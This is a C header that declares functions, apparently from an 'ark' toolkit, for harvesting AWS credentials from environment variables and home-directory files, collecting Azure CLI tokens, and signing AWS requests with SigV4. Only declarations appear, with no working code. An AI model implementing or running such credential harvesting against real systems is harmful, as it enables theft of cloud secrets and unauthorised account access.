#ifndef ARK_LINUX_CLOUD_H
#define ARK_LINUX_CLOUD_H

#include <stddef.h>

#include "ark/pb_modules.h"

void ark_cloud_trim(char *s);
int ark_cloud_parse_aws_ini(const char *path, ark_cloud_credential *creds, size_t *n, size_t max);
int ark_cloud_harvest_aws_env(ark_cloud_credential *creds, size_t *n, size_t max);
int ark_cloud_harvest_aws_files(const char *home, ark_cloud_credential *creds, size_t *n, size_t max);
int ark_cloud_harvest_azure_cli(const char *home, ark_cloud_token *toks, size_t *n, size_t max);
int ark_cloud_azure_cache_present(const char *home, ark_cloud_token *toks, size_t *n, size_t max);

/* SigV4: writes authorization header into auth (cap). Returns 1 on success. */
int ark_aws_sigv4(const char *method, const char *host, const char *path, const char *query,
    const char *payload, const char *akid, const char *secret, const char *region, const char *service,
    const char *amz_date, const char *date_stamp, char *auth, size_t auth_cap);

#endif
